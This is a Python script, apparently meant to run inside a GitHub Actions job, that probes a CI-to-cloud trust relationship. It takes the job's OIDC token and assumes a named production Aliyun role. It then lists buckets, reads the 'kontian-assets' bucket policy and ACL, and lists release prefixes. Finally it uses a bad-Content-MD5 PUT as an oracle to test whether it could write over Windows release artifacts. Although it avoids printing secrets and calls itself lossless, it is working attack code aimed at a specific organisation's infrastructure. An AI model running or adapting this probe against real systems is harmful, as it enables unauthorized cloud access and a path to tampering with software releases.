#!/usr/bin/env python3
# i-ghlive probe: obtain GitHub OIDC token from this job, try to assume the
# Aliyun role used by kt-opencode's prod environment, and (if successful) run
# read-only / lossless bucket probes. Never prints AK/SK/STS/token material.
import os, sys, json, base64, urllib.request, urllib.error, urllib.parse, subprocess

TAG = "I-GHLIVE"


def log(*a):
    print(TAG, *a, flush=True)


def http(method, url, headers=None, data=None, timeout=40):
    req = urllib.request.Request(url, method=method, headers=headers or {}, data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read()
    except Exception as e:
        return -1, {}, repr(e).encode()


def main():
    log("CONTEXT event=%s ref=%s sha=%s repo=%s actor=%s" % (
        os.environ.get("GITHUB_EVENT_NAME"), os.environ.get("GITHUB_REF"),
        (os.environ.get("GITHUB_SHA") or "")[:12], os.environ.get("GITHUB_REPOSITORY"),
        os.environ.get("GITHUB_ACTOR")))
    log("IDTOKEN_ENV url=%s token=%s" % (
        "set" if os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL") else "absent",
        "set" if os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN") else "absent"))

    url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if not url or not tok:
        log("RESULT no_id_token_permission")
        return 1

    st, _, body = http("GET", url + ("&" if "?" in url else "?") + "audience=sts.aliyuncs.com",
                       {"Authorization": "Bearer " + tok, "Accept": "application/json"})
    if st != 200:
        log("RESULT idtoken_http=%s body=%s" % (st, body[:200].decode("utf-8", "replace")))
        return 1
    jwt = json.loads(body)["value"]
    try:
        p = jwt.split(".")[1]
        p += "=" * (-len(p) % 4)
        claims = json.loads(base64.urlsafe_b64decode(p))
        log("CLAIMS sub=%s aud=%s event_name=%s ref=%s repository=%s workflow_ref=%s" % (
            claims.get("sub"), claims.get("aud"), claims.get("event_name"),
            claims.get("ref"), claims.get("repository"), claims.get("job_workflow_ref")))
    except Exception as e:
        log("CLAIMS_DECODE_ERR", repr(e)[:120])

    params = urllib.parse.urlencode({
        "Action": "AssumeRoleWithOIDC",
        "Format": "JSON",
        "Version": "2015-04-01",
        "OIDCProviderArn": "acs:ram::5590716371345016:oidc-provider/github-actions-KT-Settlement",
        "RoleArn": "acs:ram::5590716371345016:role/gha-ktaiorg-kt-opencode-prod",
        "OIDCToken": jwt,
        "RoleSessionName": "i-ghlive",
        "DurationSeconds": "900",
    }).encode()
    st, _, body = http("POST", "https://sts.aliyuncs.com/",
                       {"Content-Type": "application/x-www-form-urlencoded"}, params)
    try:
        d = json.loads(body)
    except Exception:
        d = None
    if not isinstance(d, dict) or "Credentials" not in d:
        txt = body[:600].decode("utf-8", "replace")
        if isinstance(d, dict):
            txt = json.dumps({k: d.get(k) for k in ("Code", "Message", "RequestId", "HostId")})
        log("RESULT assume_http=%s detail=%s" % (st, txt))
        return 1

    cred = d["Credentials"]
    ak, sk, sec = cred["AccessKeyId"], cred["AccessKeySecret"], cred["SecurityToken"]
    log("ASSUME_OK arn=%s expiration=%s ak_len=%d sk_len=%d token_len=%d" % (
        (d.get("AssumedRoleUser") or {}).get("Arn"), cred.get("Expiration"),
        len(ak), len(sk), len(sec)))

    subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "oss2<3"], check=False)
    try:
        import oss2
    except Exception as e:
        log("RESULT oss2_import_failed %r" % (e,))
        return 1

    auth = oss2.StsAuth(ak, sk, sec)
    svc_ep = "https://oss-us-west-1.aliyuncs.com"
    try:
        r = oss2.Service(auth, svc_ep).list_buckets()
        log("LISTBUCKETS ok n=%d first=%s" % (len(r.buckets), [b.name for b in r.buckets][:8]))
    except oss2.exceptions.OssError as e:
        log("LISTBUCKETS err status=%s code=%s msg=%s" % (e.status, e.code, (e.message or "")[:120]))
    except Exception as e:
        log("LISTBUCKETS exc", repr(e)[:150])

    bucket = oss2.Bucket(auth, svc_ep, "kontian-assets")
    for op in ("policy", "acl", "location"):
        try:
            if op == "policy":
                p = bucket.get_bucket_policy()
                txt = p.policy or ""
                log("BUCKET policy ok len=%d has_kt=%s has_win10=%s" % (
                    len(txt), "kt/" in txt, "win10/" in txt))
            elif op == "acl":
                a = bucket.get_bucket_acl()
                log("BUCKET acl ok %s" % (a.acl,))
            else:
                l = bucket.get_bucket_location()
                log("BUCKET location ok %s" % (l.location,))
        except oss2.exceptions.OssError as e:
            log("BUCKET %s err status=%s code=%s msg=%s" % (op, e.status, e.code, (e.message or "")[:120]))
        except Exception as e:
            log("BUCKET %s exc %r" % (op, e))

    for prefix in ("kt/", "kt/win10/", "kt/win10/releases/", "kito/releases/",
                   "kt-opencode-desktop/", "files/media/prod/"):
        try:
            r = bucket.list_objects(prefix=prefix, max_keys=3)
            keys = [o.key for o in r.object_list][:3]
            log("LIST %-24s ok truncated=%s sample=%s" % (prefix, r.is_truncated, keys))
        except oss2.exceptions.OssError as e:
            log("LIST %-24s err status=%s code=%s" % (prefix, e.status, e.code))
        except Exception as e:
            log("LIST %-24s exc %r" % (prefix, e))

    # Lossless write oracle: a PUT whose Content-MD5 does not match the body.
    # If the role is authorized, OSS answers InvalidDigest (nothing is stored);
    # if not authorized it answers 403 AccessDenied. No object is created.
    bad_md5 = base64.b64encode(b"\x00" * 16).decode()
    for prefix in ("kt/", "kt/win10/", "kt/win10/releases/", "kito/releases/",
                   "kt-opencode-desktop/", "files/media/prod/"):
        key = prefix + "i-ghlive-oracle-not-written.bin"
        try:
            bucket.put_object(key, b"i", headers={"Content-MD5": bad_md5})
            log("PUTORACLE %-24s UNEXPECTED_SUCCESS" % prefix)
        except oss2.exceptions.OssError as e:
            log("PUTORACLE %-24s status=%s code=%s" % (prefix, e.status, e.code))
        except Exception as e:
            log("PUTORACLE %-24s exc %r" % (prefix, e))

    log("RESULT done")
    return 0


if __name__ == "__main__":
    sys.exit(main())
